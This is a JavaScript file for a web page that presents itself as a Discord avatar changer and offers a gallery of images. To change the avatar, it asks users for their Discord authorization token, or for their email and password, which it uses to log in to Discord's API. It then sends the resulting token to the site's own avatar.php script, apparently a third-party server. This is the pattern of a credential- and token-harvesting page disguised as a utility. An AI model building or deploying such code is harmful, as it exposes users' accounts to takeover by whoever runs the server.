"use strict";

let imageArray = [
    "https://cdn.discordapp.com/attachments/288703391016943616/561495518543347753/blob.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495518648336404/custom.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495520724516904/fakegif.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495521555120128/loading.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495522372747264/cool.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495523706535946/meteor.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495530405101568/new.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495531772444672/nora.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561495534532165634/orb.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561512364059525130/flash.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561512398939357186/terrain.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561512448658767883/reeee.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561543127609901056/thinking.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561553942144876554/atoms.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561553956967546890/rainbowSphere.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561553963204345866/fancyShapes.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561572649025798162/dog.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561572649143238657/pacman.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561599295103434772/bored.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561611035665104911/wowzers.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561611196327788573/birb.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561612863802966046/ezgif.com-resize_1.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/561947683791568936/cubes.png",
    "https://cdn.discordapp.com/attachments/288703391016943616/562315611989082113/pew.png"
];

function displayQuestion1(avatarDiv) {
    return new Promise((resolve, reject) => {
        let question1 = document.createElement("div");
        question1.id = "question1";

        let questionText = document.createElement("p");
        questionText.id = "AuthQuestion";
        questionText.innerText = "Do you have two factor authentication (2FA) enabled?";

        let AuthTrue = document.createElement("button");
        AuthTrue.id = "yes";
        AuthTrue.value = "true";
        AuthTrue.innerText = "Yes";

        let AuthFalse = document.createElement("button");
        AuthFalse.id = "no";
        AuthFalse.value = "false";
        AuthFalse.innerText = "No"

        avatarDiv.appendChild(question1);
        question1.appendChild(questionText);
        question1.appendChild(AuthTrue);
        question1.appendChild(AuthFalse);

        AuthTrue.addEventListener("click", () => {
            question1.remove();
            return resolve(true);
        });

        AuthFalse.addEventListener("click", () => {
            question1.remove();
            return resolve(false);
        });
    });
}

function displayQuestion2(avatarDiv) {
    return new Promise((resolve, reject) => {
        let question2 = document.createElement("div");
        question2.id = "question2";

        let questionText = document.createElement("p");
        questionText.id = "AuthQuestion";
        questionText.innerText = "Enter your authorization token please.";

        let authToken = document.createElement("input");
        authToken.type = "text";
        authToken.id = "password";
        authToken.value = null;
        authToken.placeholder = "authorization token";

        let submit = document.createElement("button");
        submit.id = "submit";
        submit.innerText = "Change Avatar";

        avatarDiv.appendChild(question2);
        question2.appendChild(questionText);
        question2.appendChild(authToken);
        question2.appendChild(submit);

        submit.addEventListener("click", () => {
            if (authToken.value) {
                question2.remove();
                resolve(authToken.value);
            } else {
                questionText.innerText = "Enter a valid email and password please!";
                setTimeout(() => {
                    questionText.innerText = "Enter your email and password please.";
                }, 1000);
            }
        });
    });
}

function displayQuestion3(avatarDiv) {
    return new Promise((resolve, reject) => {
        let question3 = document.createElement("div");
        question3.id = "question3";

        let questionText = document.createElement("p");
        questionText.id = "AuthQuestion";
        questionText.innerText = "Enter your email and password please.";

        let email = document.createElement("input");
        email.type = "text";
        email.id = "email";
        email.value = null;
        email.placeholder = "email";

        let password = document.createElement("input");
        password.type = "password";
        password.id = "password";
        password.value = null;
        password.placeholder = "password";

        let submit = document.createElement("button");
        submit.id = "submit";
        submit.innerText = "Change Avatar";

        avatarDiv.appendChild(question3);
        question3.appendChild(questionText);
        question3.appendChild(email);
        question3.appendChild(password);
        question3.appendChild(submit);

        submit.addEventListener("click", () => {
            if (email.value && password.value) {
                question3.remove();
                var returnData = {
                    "email": email.value,
                    "password": password.value
                };
                resolve(returnData);
            } else {
                questionText.innerText = "Enter a valid email and password please!";
                setTimeout(() => {
                    questionText.innerText = "Enter your email and password please.";
                }, 1000);
            }
        });
    });
}

function createImage(url, isChosen) {
    let image = document.createElement("button");
    image.className = "avatarImages";
    image.style.backgroundImage = `url(${url})`;
    if (isChosen) {
        image.style.width = "25vh";
        image.style.height = "25vh";
    }
    return image;
}

function displayChosenAvatar(avatarDiv, imageUrl) {
    var newImage = createImage(imageUrl, true);
    avatarDiv.appendChild(newImage);
    return imageUrl;
}

function displayAvatarQuestion(avatarDiv) {
    return new Promise((resolve, reject) => {
        let question = document.createElement("div");
        question.id = "question";

        let questionText = document.createElement("p");
        questionText.id = "AvatarQuestion";
        questionText.innerText = "Click the image you would like to use as your avatar.";
        
        avatarDiv.appendChild(question);        
        question.appendChild(questionText);        

        for (var i = 0; i < imageArray.length; i++) {
            try {
                throw i;
            } catch (ii) {
                var newImage = createImage(imageArray[ii]);
                question.appendChild(newImage);
                newImage.addEventListener("click", () => {
                    question.remove();
                    resolve(imageArray[ii]);
                });
            }
        }
    });
}

function postFormRequest(url, content) {
    return new Promise((resolve, reject) => {
        var request = new XMLHttpRequest();
        request.onreadystatechange = function () {
            if (request.readyState !== 4) return;
            if (request.status >= 200 && request.status < 300) {
                return resolve(request.responseText);
            } else {
                return reject({
                    status: request.status,
                    statusText: request.statusText
                });
            }
        };
        request.open("POST", url, true);
        request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        request.send(content);
    });
};

function postJsonRequest(url, content) {
    return new Promise((resolve, reject) => {
        var request = new XMLHttpRequest();
        request.onreadystatechange = function () {
            if (request.readyState !== 4) return;
            if (request.status >= 200 && request.status < 300) {
                return resolve(request.responseText);
            } else {
                return reject({
                    status: request.status,
                    statusText: request.statusText
                });
            }

        };
        request.open("POST", url, true);
        request.setRequestHeader("Content-Type", "application/json");
        request.send(content);
    });
};

function login(email, password) {
    var data = JSON.stringify({
        "email": email,
        "password": password,
        "undelete": false,
        "captcha_key": null,
        "login_source": null,
        "gift_code_sku_id": null
    });
    return postJsonRequest("https://discordapp.com/api/v6/auth/login", data);
}

function safeParseJSON(jsonString) {
    try {
        return JSON.parse(jsonString);
    } catch (e) {
        return false;
    }
}

window.onload = () => {
    let avatarDiv = document.getElementById("avatar");
    if (avatarDiv) {
        displayQuestion1(avatarDiv).then(response => {
            if (response) {
                displayAvatarQuestion(avatarDiv).then(imageUrl => {
                    displayChosenAvatar(avatarDiv, imageUrl);
                    displayQuestion2(avatarDiv).then(token => {
                        let tokenData = `authToken=${token}&imageUrl=${imageUrl}`;
                        postFormRequest("./avatar.php", tokenData).then(response => {
                            let jsonResponse2 = safeParseJSON(response);
                            if (jsonResponse2) {
                                let responseCode = jsonResponse2["code"];
                                if (responseCode !== undefined && responseCode !== null) {
                                    console.error(`${jsonResponse2["code"]} : ${jsonResponse2["message"]}`);
                                    alert(jsonResponse2["message"]);
                                    location.href = "https://dikkeboktor.com/Mischa/discord";
                                    return false;
                                }
                                let avatarCheck = jsonResponse2["avatar"];
                                if (Array.isArray(avatarCheck)) {
                                    console.error(avatarCheck);
                                    alert("Please wait before changing your avatar again!");
                                    location.href = "https://dikkeboktor.com/Mischa/discord";
                                    return false;
                                }
                                console.log(jsonResponse2);
                            }
                        }).catch(err => {
                            console.error(err);
                        });
                    });
                });
            } else {
                displayAvatarQuestion(avatarDiv).then(imageUrl => {
                    displayChosenAvatar(avatarDiv, imageUrl);
                    displayQuestion3(avatarDiv).then(data => {
                        if (data) {
                            login(data.email, data.password).then(response => {
                                let jsonResponse = safeParseJSON(response);
                                if (jsonResponse) {
                                    let token = jsonResponse.token;
                                    let tokenData = `authToken=${token}&imageUrl=${imageUrl}`;
                                    postFormRequest("./avatar.php", tokenData).then(response => {
                                        let jsonResponse2 = safeParseJSON(response);
                                        if (jsonResponse2) {
                                            let responseCode = jsonResponse2["code"];
                                            if (responseCode !== undefined && responseCode !== null) {
                                                console.error(`${jsonResponse2["code"]} : ${jsonResponse2["message"]}`);
                                                alert(jsonResponse2["message"]);
                                                location.href = "https://dikkeboktor.com/Mischa/discord";
                                                return false;
                                            }
                                            let avatarCheck = jsonResponse2["avatar"];
                                            if (Array.isArray(avatarCheck)) {
                                                console.error(avatarCheck);
                                                alert("Please wait before changing your avatar again!");
                                                location.href = "https://dikkeboktor.com/Mischa/discord";
                                                return false;
                                            }
                                            console.log(jsonResponse2);
                                        }
                                    }).catch(err => {
                                        console.error(err);
                                    });
                                }
                            }).catch(err => {
                                console.error(err);
                            });
                        }
                    });
                });
            }
        });
    }
}
